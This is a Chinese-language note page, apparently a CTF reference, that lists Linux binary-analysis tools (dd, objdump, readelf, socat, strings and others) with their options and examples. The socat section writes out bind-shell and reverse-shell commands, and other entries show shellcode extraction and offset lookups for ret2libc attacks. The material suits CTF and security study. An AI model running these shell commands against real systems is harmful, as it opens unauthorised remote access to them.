```
title: linux汇总
published: 2024-11-5
description: 一次单人三排的CTF
tags: [contest,CTF]
category: CTF
draft: true
```

# 9.1 更多 Linux 工具

- [dd](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#dd)
- [dmesg](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#dmesg)
- [file](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#file)
- [edb](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#edb)
- [foremost](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#foremost)
- [ldd](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#ldd)
- [ltrace](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#ltrace)
- [md5sum](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#md5sum)
- [nm](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#nm)
- [objcopy](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#objcopy)
- [objdump](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#objdump)
- [od](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#od)
- [readelf](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#readelf)
- [socat](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#socat)
- [ssdeep](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#ssdeep)
- [strace](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#strace)
- [strip](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#strip)
- [strings](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#strings)
- [valgrind](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#valgrind)
- [xxd](https://firmianay.gitbook.io/ctf-all-in-one/9_appendix/9.1_linuxtools#xxd)

## dd

**dd** 命令用于复制文件并对原文件的内容进行转换和格式化处理。

### 重要参数

Copy

```
if=FILE         read from FILE instead of stdin
of=FILE         write to FILE instead of stdout
skip=N          skip N ibs-sized blocks at start of input
bs=BYTES        read and write up to BYTES bytes at a time
```

patch 偏移 12345 处的一个字节：

Copy

```
echo 'X' | dd of=binary.file bs=1 seek=12345 count=1
```

### 常见用法

Copy

```
$ dd if=[file1] of=[file2] skip=[size] bs=[bytes]
```

dump 运行时的内存镜像：

- `cat /proc/<pid>/maps`
- 找到内存中 text 段和 data 段
- `dd if=/proc/<pid>/mem of=/path/a.out skip=xxxx bs= 1 count=xxxx`

## dmesg

**dmesg** 命令用于显示 Linux 内核环形缓冲区（ring buffer）的信息。开机信息和各种错误信息都会放到里面。在调试和故障诊断中非常有用。

Copy

```
-c, --read-clear
      Clear the ring buffer after first printing its contents.
-s, --buffer-size size
      Use a buffer of size to query the kernel ring buffer.  This is 16392  by  default.
-n, --console-level level
      Set the level at which printing of messages is done to the console.
```

## file

**file** 命令用来探测给定文件的类型。

### 技巧

Copy

```
$ file -L [file]
```

当文件是链接文件时，直接显示符号链接所指向的文件类别。

## edb

**edb** 是一个同时支持x86、x86-64的调试器。它主要向 OllyDbg 工具看齐，并可通过插件体系进行功能的扩充。

### 安装

Copy

```
$ yaourt -S edb
```

## foremost

**foremost** 是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具。

Copy

```
$ yaourt -S foremost
```

## ldd

**ldd** 命令用于打印程序或者库文件所依赖的共享库列表。

ldd 实际上仅是 shell 脚本，重点是环境变量 `LD_TRACE_LOADED_OBJECTS`，在执行文件时把它设为 `1`，则与执行 ldd 效果一样。

Copy

```
$ ldd [executable]

$ LD_TRACE_LOADED_OBJECTS=1 [executable]
```

## ltrace

**ltrace** 命令用于跟踪进程调用库函数的情况。

Copy

```
-f                  trace children (fork() and clone()).
-p PID              attach to the process with the process ID pid.
-S                  trace system calls as well as library calls.
```

## md5sum

**md5sum** 命令采用MD5报文摘要算法（128位）计算和检查文件的校验和。

Copy

```
-b, --binary         read in binary mode
-c, --check          read MD5 sums from the FILEs and check them
```

## nm

**nm** 命令被用于显示二进制目标文件的符号表。

Copy

```
-a, --debug-syms       Display debugger-only symbols
-D, --dynamic          Display dynamic symbols instead of normal symbols
-g, --extern-only      Display only external symbols
```

## objcopy

如果我们要将一个二进制文件，比如图片、MP3音乐等东西作为目标文件中的一个段，可以使用 objcopy 工具，比如我们有一个图片文件 “image.jpg”：

Copy

```
$ objcopy -I binary -O elf32-i386 -B i386 image.jpg image.o

$ objdump -ht image.o

image.o:     file format elf32-i386

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .data         0000642f  00000000  00000000  00000034  2**0
                  CONTENTS, ALLOC, LOAD, DATA
SYMBOL TABLE:
00000000 l    d  .data	00000000 .data
00000000 g       .data	00000000 _binary_image_jpg_start
0000642f g       .data	00000000 _binary_image_jpg_end
0000642f g       *ABS*	00000000 _binary_image_jpg_size
```

三个变量的使用方法如下：

Copy

```
const char *start = _binary_image_jpg_start;    // 数据的起始地址
const char *end = _binary_image_jpg_end;        // 数据的末尾地址+1
int size = (int)_binary_image_jpg_size;         // 数据大小
```

这一技巧可能出现在 CTF 隐写题中，使用 foremost 工具可以将图片提取出来：

Copy

```
$ foremost image.o
```

## objdump

**objdump** 命令是用查看目标文件或者可执行的目标文件的构成的gcc工具。

Copy

```
-d, --disassemble        Display assembler contents of executable sections
-S, --source             Intermix source code with disassembly
-s, --full-contents      Display the full contents of all sections requested
-R, --dynamic-reloc      Display the dynamic relocation entries in the file
-l, --line-numbers             Include line numbers and filenames in output
-M intel                 Display instruction in Intel ISA
```

对特定段进行转储：

Copy

```
$ objdump -s -j [section] [binary]
```

对地址进行指定和转储：

Copy

```
$ objdump -s --start-address=[address] --stop-address=[address] [binary]
```

当包含调试信息时，还可以使用 `-l` 和 `-S` 来分别对应行号和源码。

结合使用 *objdump* 和 *grep*。

Copy

```
$ objdump -d [executable] | grep -A 30 [function_name]
```

查找 **GOT** 表地址：

Copy

```
$ objdump -R [binary] | grep [function_name]
```

从可执行文件中提取 **shellcode** (注意，在objdump中可能会删除空字节):

Copy

```
$ for i in `objdump -d print_flag | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done
```

## od

**od** 命令用于输出文件的八进制、十六进制或其它格式编码的字节，通常用于显示或查看文件中不能直接显示在终端的字符。

Copy

```
  -A, --address-radix=RADIX   output format for file offsets; RADIX is one
                                of [doxn], for Decimal, Octal, Hex or None
  -t, --format=TYPE           select output format or formats
  -v, --output-duplicates     do not use * to mark line suppression
```

另外加上 `z` 可以显示 ASCII 码。

用十六进制转存每个字节：

Copy

```
$ od -t x1z -A x [file]
```

转存字符串：

Copy

```
$ od -A x -s [file]

$ od -A n -s [file]
```

## readelf

**readelf** 命令用来显示一个或者多个 elf 格式的目标文件的信息，可以通过它的选项来控制显示哪些信息。

Copy

```
-h --file-header       Display the ELF file header
-e --headers           Equivalent to: -h -l -S
-l --program-headers   Display the program headers
-S --section-headers   Display the sections' header
-s --syms              Display the symbol table
-r --relocs            Display the relocations (if present)
-d --dynamic           Display the dynamic section (if present)
```

另外 `-w` 选项表示 DWARF2 调试信息。

查找库中函数的偏移量，常用于 **ret2lib**：

Copy

```
$ readelf -s [path/to/library.so] | grep [function_name]@
```

例如：

Copy

```
$ readelf -s /usr/lib/libc-2.26.so | grep system@
   595: 0000000000041fa0    45 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1378: 0000000000041fa0    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
```

## socat

**socat** 是 netcat 的加强版，CTF 中经常需要使用使用它连接服务器。

Copy

```
$ yaourt -S socat
```

Copy

```
$ socat [options] <address> <address>
```

连接远程端口

Copy

```
$ socat - TCP:localhost:80
```

监听端口

Copy

```
$ socat TCP-LISTEN:700 -
```

正向 shell

Copy

```
$ socat TCP-LISTEN:700 EXEC:/bin/bash
```

反弹 shell

Copy

```
$ socat tcp-connect:localhost:700 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

将本地 80 端口转发到远程的 80 端口

Copy

```
$ socat TCP-LISTEN:80,fork TCP:www.domain.org:80
```

fork 服务器

Copy

```
$ socat tcp-l:9999,fork exec:./pwn1
```

跟踪 malloc 和 free 调用及相应的地址：

Copy

```
$ socat tcp-listen:1337,fork,reuseaddr system:"ltrace -f -e malloc+free-@libc.so*  ./pwn"
```

## ssdeep

模糊哈希算法又叫基于内容分割的分片分片哈希算法（context triggered piecewise hashing, CTPH），主要用于文件的相似性比较。

Copy

```
-m - Match FILES against known hashes in file
-b - Uses only the bare name of files; all path information omitted
```

Copy

```
$ ssdeep -b orginal.elf > hash.txt
$ ssdeep -bm hash.txt modified.elf
```

## strace

**strace** 命令对应用的系统调用和信号传递的跟踪结果进行分析，以达到解决问题或者是了解应用工作过程的目的。

Copy

```
-i             print instruction pointer at time of syscall
-o file        send trace output to FILE instead of stderr
-c             count time, calls, and errors for each syscall and report summary
-e expr        a qualifying expression: option=[!]all or option=[!]val1[,val2]...
   options:    trace, abbrev, verbose, raw, signal, read, write, fault
-p pid         trace process with process id PID, may be repeated
-f             follow forks
```

## strip

**strip** 命令用于删除可执行文件中的符号和段。

Copy

```
-g -S -d --strip-debug           Remove all debugging symbols & sections
-R --remove-section=<name>       Also remove section <name> from the output
```

使用 `-d` 后，可以删除不使用的信息，并保留函数名等。用 gdb 进行调试时，只要保留了函数名，都可以进行调试。另外如果对 `.o` 和 `.a` 文件进行 strip 后，就不能和其他目标文件进行链接了。

## strings

**strings** 命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。strings 命令对识别随机对象文件很有用。

Copy

```
-a --all                  Scan the entire file, not just the data section [default]
-t --radix={o,d,x}        Print the location of the string in base 8, 10 or 16
-e --encoding={s,S,b,l,B,L} Select character size and endianess:
                            s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit
```

`-e` 的作用，例如在这样一个二进制文件中：

Copy

```
$ rabin2 -z a.out
vaddr=0x080485d0 paddr=0x000005d0 ordinal=000 sz=17 len=16 section=.rodata type=ascii string=Enter password:
vaddr=0x080485e5 paddr=0x000005e5 ordinal=001 sz=10 len=9 section=.rodata type=ascii string=Congrats!
vaddr=0x080485ef paddr=0x000005ef ordinal=002 sz=7 len=6 section=.rodata type=ascii string=Wrong!
vaddr=0x0804a040 paddr=0x00001040 ordinal=000 sz=36 len=8 section=.data type=utf32le string=w0wgreat
```

字符串 `w0wgreat` 类型为 utf32le，而不是传统的 ascii，这时 strings 就需要指定 `-e L` 参数：

Copy

```
$ strings a.out | grep w0wgreat
$ strings -e L a.out | grep w0wgreat
w0wgreat
```

组合使用 *strings* 和 *grep*。

在 **ret2lib** 攻击中，得到字符串的偏移：

Copy

```
$ strings -t x /lib32/libc-2.24.so | grep /bin/sh
```

检查是否使用了 **UPX** 加壳

Copy

```
$ strings [executable] | grep -i upx
```

## valgrind

valgrind 能检测出内存的非法使用等。使用它无需在检测对象程序编译时指定特别的参数，也不需要链接其他的函数库。

Copy

```
--leak-check=no|summary|full     search for memory leaks at exit?  [summary]
--show-reachable=yes             same as --show-leak-kinds=all
--trace-children=no|yes   Valgrind-ise child processes (follow execve)? [no]
--vgdb=no|yes|full        activate gdbserver? [yes]
                          full is slower but provides precise watchpoint/step
```

## xxd

**xxd** 的作用就是将一个文件以十六进制的形式显示出来。

Copy

```
-g          number of octets per group in normal output. Default 2 (-e: 4).
-i          output in C include file style.
-l len      stop after <len> octets.
-r          reverse operation: convert (or patch) hexdump into binary.
-u          use upper case hex letters.
```

Copy

```
$ xxd -g1 [binary]
```
